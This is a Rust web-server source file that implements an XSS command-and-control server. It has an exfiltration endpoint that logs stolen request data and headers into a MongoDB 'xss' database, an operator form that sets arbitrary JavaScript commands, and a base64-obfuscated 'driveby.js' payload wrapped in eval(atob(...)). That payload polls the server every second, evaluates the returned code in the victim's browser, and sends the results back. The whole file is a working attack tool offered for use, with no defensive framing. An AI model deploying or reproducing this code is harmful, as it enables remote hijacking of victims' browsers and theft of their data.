#![feature(lazy_cell)]
use std::{collections::HashMap, sync::LazyLock};

use anyhow::Result;
use axum::{
    body::{Body, Bytes, HttpBody},
    extract::State,
    response::{IntoResponse, Redirect, Response},
    routing::{any, get, post},
    Form, Router,
};

use base64::{
    alphabet::STANDARD,
    engine::{GeneralPurpose, GeneralPurposeConfig},
    Engine,
};
use clap::Parser;
use http::{Request, StatusCode};
use mongodb::Client;
use serde::{Deserialize, Serialize};
use tokio::{
    fs::{self, create_dir_all},
    sync::Mutex,
};
use tower_http::{
    cors::{Any, CorsLayer},
    services::{ServeDir, ServeFile},
    trace::{DefaultMakeSpan, DefaultOnFailure, DefaultOnRequest, DefaultOnResponse, TraceLayer},
};
use tracing::Level;
#[derive(Parser)]
struct Config {
    #[clap(long, env)]
    mongo_uri: String,
    #[clap(long, env)]
    host: String,
    #[clap(long, env)]
    port: u16,
}

static CONFIG: LazyLock<Config> = LazyLock::new(Config::parse);

#[tokio::main]
async fn main() -> Result<()> {
    let client = Client::with_uri_str(&CONFIG.mongo_uri).await?;
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();
    let trace_layer = TraceLayer::new_for_http()
        .make_span_with(
            DefaultMakeSpan::new()
                .include_headers(false)
                .level(Level::INFO),
        )
        .on_request(DefaultOnRequest::new().level(Level::INFO))
        .on_response(DefaultOnResponse::new().level(Level::INFO))
        .on_failure(DefaultOnFailure::new().level(Level::ERROR));

    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any)
        // .allow_credentials(true)
        .allow_private_network(true)
        .expose_headers(Any);

    create_dir_all("static").await?;
    if !fs::try_exists("static/index.html").await? {
        fs::write(
                "static/index.html",
                br#"<html><head><title>My Site</title></head><body><p>Nothing to see here</p></body></html>"#,
            ).await?;
    }

    let serve_dir = ServeDir::new("static");
    let index = ServeFile::new("static/index.html");

    let app = Router::new()
        .route("/x", any(exfil))
        .route("/x/*rest", any(exfil))
        .route("/cb", any(call_back))
        .route("/payload", any(payload))
        .route("/command", get(command))
        .route("/command", post(command_submit))
        .route("/driveby.js", get(driveby))
        .nest_service("/static", serve_dir.clone())
        .fallback_service(index)
        .layer(cors)
        .layer(trace_layer)
        .with_state(client);

    let addr = format!("0.0.0.0:{}", CONFIG.port).parse()?;
    tracing::info!("listening on {}", addr);
    axum::Server::bind(&addr)
        .serve(app.into_make_service())
        .await?;
    Ok(())
}

#[derive(Debug, Serialize, Deserialize)]
#[serde(untagged)]
enum StrOrBytes {
    Str(String),
    Bytes(Vec<u8>),
}

#[derive(Debug, Serialize, Deserialize)]
struct ExfilData {
    data: StrOrBytes,
    headers: HashMap<String, StrOrBytes>,
    uri: String,
}

async fn exfil(
    State(client): State<Client>,
    mut request: Request<Body>,
) -> Result<StatusCode, StatusCode> {
    let coll = client.database("xss").collection::<ExfilData>("exfil");
    let headers: HashMap<_, _> = request
        .headers()
        .iter()
        .map(|(k, v)| {
            (
                k.to_string(),
                match v.to_str() {
                    Ok(v) => StrOrBytes::Str(v.to_string()),
                    Err(_) => StrOrBytes::Bytes(v.as_bytes().to_vec()),
                },
            )
        })
        .collect();
    let body: Vec<u8> = request
        .body_mut()
        .data()
        .await
        .unwrap_or(Ok(Bytes::new()))
        .or(Err(StatusCode::INTERNAL_SERVER_ERROR))?
        .to_vec();
    let data = match std::str::from_utf8(&body) {
        Ok(s) => StrOrBytes::Str(s.to_string()),
        Err(_) => StrOrBytes::Bytes(body),
    };
    let doc: ExfilData = ExfilData {
        data,
        headers,
        uri: request.uri().to_string(),
    };
    coll.insert_one(doc, None)
        .await
        .or(Err(StatusCode::INTERNAL_SERVER_ERROR))?;
    Ok(StatusCode::OK)
}

static COMMAND: LazyLock<Mutex<String>> = LazyLock::new(|| Mutex::new(String::new()));

#[derive(Deserialize)]
struct Command {
    command: String,
}

async fn command_submit(Form(Command { command }): Form<Command>) -> impl IntoResponse {
    let mut cmd = COMMAND.lock().await;
    *cmd = command;
    Redirect::to("/command")
}

async fn command() -> impl IntoResponse {
    let mut command = COMMAND.lock().await.to_string();
    if command.is_empty() {
        command = "No command".to_string();
    }
    let page = format!(
        r#"<html>
    <form>
        <input type="text" name="command" />
        <input type="submit" formmethod="post" value="Submit" />
        <p>Current command: </p>
        <code><pre>{}</pre></code>
    </form>
    </html>"#,
        command
    );
    let mut res = Response::new(page);
    res.headers_mut()
        .insert("Content-Type", "text/html".parse().unwrap());
    res
}

async fn call_back() -> impl IntoResponse {
    let cmd = COMMAND.lock().await;
    let body = cmd.clone();
    let mut res = Response::new(body);
    res.headers_mut()
        .insert("Content-Type", "application/javascript".parse().unwrap());
    res
}

static PAYLOAD: LazyLock<String> = LazyLock::new(|| {
    let payload = format!(
        r#"function lg(...t){{fetch("http://{}:{}/x",{{method:"POST",body:JSON.stringify(t)}})}}setInterval(function(){{let console={{}};console.log=lg,fetch("http://{}:{}/cb").then(function(t){{return t.text()}}).then(function(data){{if(data)try{{(res=eval(data))&&console.log(res)}}catch(e){{console.log(e)}}}}).catch(function(t){{console.log(t)}})}},1000);"#,
        CONFIG.host, CONFIG.port, CONFIG.host, CONFIG.port
    );

    let engine = GeneralPurpose::new(&STANDARD, GeneralPurposeConfig::new());
    let encoded = engine.encode(payload.as_bytes());
    format!("eval(atob('{}'))", encoded)
});

async fn payload() -> impl IntoResponse {
    PAYLOAD.to_string()
}

async fn driveby() -> impl IntoResponse {
    let mut res = Response::new(PAYLOAD.to_string());
    res.headers_mut()
        .insert("Content-Type", "application/javascript".parse().unwrap());
    res
}
